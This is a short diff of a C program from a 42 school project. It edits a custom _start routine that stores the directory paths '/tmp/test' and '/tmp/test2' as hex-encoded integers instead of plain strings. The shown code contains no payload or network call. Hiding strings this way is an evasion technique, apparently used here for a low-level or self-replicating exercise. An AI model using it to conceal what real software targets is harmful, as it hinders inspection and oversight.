@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:26 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/21 13:40:17 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/21 16:21:18 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,7 @@ void _start() {
 	int64_t		fd;
 	byte		buff[BUFF_SIZE];
 	//str		directories[] = {"/tmp/test1", "/tmp/test2", NULL};
-	uint64_t	directories[] = {0x7365742f706d742f, 0x003174, 0x7365742f706d742f, 0x003274, 0, 0};
+	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
 	char		max_path[513];
 	dirent		*d;
 	uint64_t	string = 0x000a303132333435;
